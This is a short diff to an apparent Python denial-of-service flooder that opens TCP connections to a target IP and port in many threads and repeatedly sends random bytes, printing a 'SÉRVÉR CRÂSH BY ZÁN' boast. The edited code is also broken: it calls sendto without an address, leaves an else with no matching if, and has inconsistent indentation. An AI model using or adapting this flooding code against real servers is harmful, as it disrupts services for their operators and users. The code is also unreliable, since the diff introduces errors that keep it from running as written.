@@ -378,24 +378,25 @@ def start():
         except:
             s.close()
             print('[+] server error')
-def attck():
- data = random._urandom(57777)
- mm = random.choice(("[*]","[!]","[#]"))
+def stack():
+ data = random._urandom(5000)
+ i = random.choice(("[*]","[!]","[#]"))
  while True:
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ip,port))
-         s.send(data)
-         for x in range(pack):
-				 s.send(data)
-			print("SÉRVÉR {1} CRÂSH BY ZÁN")
-		except:
-			s.close()
-			print("[+] server error")
+         s.sendto(data)
+         for y in range(pack):
+          s.sendto(data)
+          print("SÉRVÉR {1} CRÂSH BY ZÁN")
+       except:
+          print("[+] server error")
+         
+           
 for x in range(th):
-  if choice == 'y':
   thred = threading.Thread(target=start)
   thred.start()
 else: 
-  thred = threading.Thread(target=attck)
+  thred = threading.Thread(target=stack)
   thred.start()
+  
